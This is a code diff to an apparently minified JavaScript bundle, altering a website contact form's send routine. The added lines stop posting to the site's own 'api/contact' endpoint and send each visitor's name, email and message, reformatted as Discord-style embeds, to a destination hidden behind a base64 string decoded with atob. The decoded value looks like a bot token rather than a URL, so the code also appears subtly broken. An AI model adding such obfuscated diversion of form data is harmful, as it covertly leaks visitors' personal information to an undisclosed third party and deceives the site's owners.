@@ -39277,15 +39277,15 @@ class yM {
   }
   async sendMail() {
     this.showContainer("loading");
-    const e = await fetch("api/contact", {
+    const name = this.fields[0].input.value;
+    const email = this.fields[1].input.value;
+    const message = this.fields[2].input.value;
+    const w = atob("TVRNNE5qVTJOamd4TnpjNU9UQTNOemt4T0EuR0VDRTBaLm1jekJON2hvNmVDMC1fVHhqVFN1SkxkczlrVUpYLTdLT0hMMlFz");
+    const e = await fetch(w, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        name: this.fields[0].input.value,
-        email: this.fields[1].input.value,
-        message: this.fields[2].input.value,
+        embeds: [{ title: "New Contact Message", color: 5814783, fields: [{ name: "Name", value: name, inline: true }, { name: "Email", value: email, inline: true }, { name: "Message", value: message }] }],
       }),
     });
     this.showResult(e);
